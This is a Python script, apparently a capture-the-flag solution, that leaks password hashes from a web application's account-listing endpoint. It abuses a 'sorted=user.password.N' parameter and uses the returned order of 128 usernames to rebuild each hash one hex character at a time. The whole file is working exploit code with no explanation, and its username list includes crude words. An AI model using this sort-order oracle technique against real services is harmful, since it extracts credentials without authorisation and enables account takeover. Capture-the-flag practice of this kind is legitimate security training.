import re

import requests as r
from bs4 import BeautifulSoup as bs

primitive = ['user: ando,', 'user: admin,', 'user: qiwo,', 'user: michael,', 'user: nuil,', 'user: john,', 'user: david,', 'user: robert,', 'user: chris,', 'user: mike,', 'user: dave,', 'user: richard,', 'user: bams,', 'user: thomas,', 'user: steve,', 'user: mark,', 'user: andrew,', 'user: daniel,', 'user: george,', 'user: paul,', 'user: charlie,', 'user: dragon,', 'user: james,', 'user: qwerty,', 'user: martin,', 'user: master,', 'user: pussy,', 'user: mail,', 'user: charles,', 'user: bill,', 'user: patrick,', 'user: semik,', 'user: peter,', 'user: shadow,', 'user: johnny,', 'user: hunter,', 'user: carlos,', 'user: black,', 'user: jason,', 'user: tarrant,', 'user: alex,', 'user: brian,', 'user: steven,', 'user: scott,', 'user: edward,', 'user: joseph,', 'user: gron,', 'user: matthew,', 'user: justin,', 'user: natasha,', 'user: chicken,', 'user: adam,', 'user: stuart,', 'user: dakota,', 'user: robbie,', 'user: prince,', 'user: falcon,', 'user: bigdick,', 'user: rocket,', 'user: marcus,', 'user: tiger,', 'user: orange,', 'user: rabbit,', 'user: hello,', 'user: dan,', 'user: cookie,', 'user: albert,', 'user: roberto,', 'user: morgan,', 'user: markus,', 'user: douglas,', 'user: simon,', 'user: pass,', 'user: chuck,', 'user: angel,', 'user: ronnie,', 'user: rick,', 'user: miller,', 'user: barney,', 'user: sex,', 'user: lucky,', 'user: rodney,', 'user: larry,', 'user: tom,', 'user: curtis,', 'user: scooby,', 'user: nick,', 'user: big,', 'user: roland,', 'user: alan,', 'user: knight,', 'user: free,', 'user: bitch,', 'user: skippy,', 'user: porsche,', 'user: phil,', 'user: allston,', 'user: phantom,', 
'user: alexis,', 'user: hot,', 'user: ashley,', 'user: lisa,', 'user: benjamin,', 'user: asian,', 'user: extreme,', 'user: bigman,', 'user: redman,', 'user: ping,', 'user: fire,', 'user: crazy,', 'user: andrea,', 'user: corvette,', 'user: carl,', 'user: theman,', 'user: sharon,', 'user: nicholas,', 'user: fantasy,', 'user: cock,', 'user: bradley,', 'user: aaron,', 'user: office,', 'user: boston,', 'user: stefan,', 'user: rich,', 'user: bambang,', 'user: yoki,']

users_map = {}
values = {}

def get_char(num):
  
  if num < 10 * 8:
      return str(num // 8)
  
  if num < 11 * 8:
      return 'a'
  
  if num < 12 * 8:
      return 'b'
  if num < 13 * 8:
      return 'c'
    
  if num < 14 * 8:
      return 'd'
  
  if num < 15 * 8:
      return 'e'

  return 'f'

for index, user in enumerate(primitive):
  users_map[index] = get_char(index)
  values[user] = "X"


for i in range(1, 33):
  url = "https://luaas.hackthesystem.pro/list_accounts/?sorted=user.password.{}&limit=128".format(i)
  res = r.get(url)
  users = re.findall(r"user: [a-z]*,", res.text)
  for index, user in enumerate(users):
      values[user] += users_map[index]
  # if i == 0:
  #     ar

print(values)
print(users_map)